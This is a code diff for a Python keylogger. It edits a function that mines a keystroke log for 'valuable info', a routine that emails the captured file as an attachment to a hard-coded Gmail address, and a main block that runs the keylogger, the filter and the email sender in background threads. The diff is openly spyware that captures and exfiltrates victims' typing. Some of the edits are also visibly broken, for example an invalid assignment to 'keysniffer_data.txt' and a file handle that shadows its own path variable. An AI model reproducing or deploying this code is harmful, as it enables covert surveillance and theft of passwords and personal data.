@@ -32,9 +32,9 @@ from collections import Counter
 import os
 
 
-def extract_valuable_info(file_path, output_path):
+def extract_valuable_info(keysniffer_data, filtered_data):
 
-    with open(file_path, "r") as file:
+    with open(keysniffer_data, "r") as file:
         data = file.read()
 
     # Define patterns for valuable information
@@ -62,23 +62,23 @@ def extract_valuable_info(file_path, output_path):
     extracted_data["common_words"] = common_words
 
     # Verify if the output file exists, create it if not
-    if not os.path.exists(output_path):
-        with open(output_path, "w") as output_file:
+    if not os.path.exists(filtered_data):
+        with open(filtered_data, "w") as filtered_data:
             pass
 
     # Write the extracted data to the output file
-    with open(output_path, "w") as output_file:
+    with open(filtered_data, "w") as filtered_data:
         for category, items in extracted_data.items():
-            output_file.write(f"{category.capitalize()}:\n")
+            filtered_data.write(f"{category.capitalize()}:\n")
             for item in items:
-                output_file.write(f"  {item}\n")
-            output_file.write("\n")
+                filtered_data.write(f"  {item}\n")
+            filtered_data.write("\n")
 
 
 # usage
-file_path = "keystrokes.log"  # Path to the log file
-output_path = "valuable_info.txt"  # Path to the output file
-extract_valuable_info(file_path, output_path)
+keysniffer_data = "keysniffer_data.txt"  # Path to the log file
+filtered_data = "valuable_info.txt"  # Path to the output file
+extract_valuable_info(keysniffer_data, filtered_data)
 
 
 # ===================================================== Sending by email =========================================================
@@ -97,7 +97,7 @@ sender_email = "7unkym0nk3y@gmail.com"  # email from the account
 receiver_email = "7unkym0nk3y@gmail.com"  # email from the sender
 
 # File to attach
-file_path = "keysniffer_data.txt"
+keysniffer_data.txt = "keysniffer_data.txt"
 
 
 def send_email():
@@ -113,13 +113,13 @@ def send_email():
     message.attach(MIMEText(email_body, "html"))
 
     # Attach the file
-    with open(file_path, "rb") as file:
+    with open(keysniffer_data, "rb") as file:
         part = MIMEBase("application", "octet-stream")
         part.set_payload(file.read())
         encoders.encode_base64(part)
         part.add_header(
             "Content-Disposition",
-            f"attachment; filename={file_path}",
+            f"attachment; filename={keysniffer_data}",
         )
         message.attach(part)
 
@@ -156,14 +156,20 @@ if __name__ == "__main__":
         # Start the keylogger in one thread
         keylogger_thread = threading.Thread(target=keylogger, daemon=True)
 
+        # Start the keylogger in another thread
+        filter_thread = threading.Thread(target=extract_valuable_info, daemon=True)
+
         # Start the email sender in another thread
         email_thread = threading.Thread(target=send_email_periodically, daemon=True)
 
+        filter_thread.start()
         keylogger_thread.start()
         email_thread.start()
 
         # Keep the main thread alive
+        filter_thread.join()
         keylogger_thread.join()
         email_thread.join()
+
     except KeyboardInterrupt:
         print("Program stopped.")
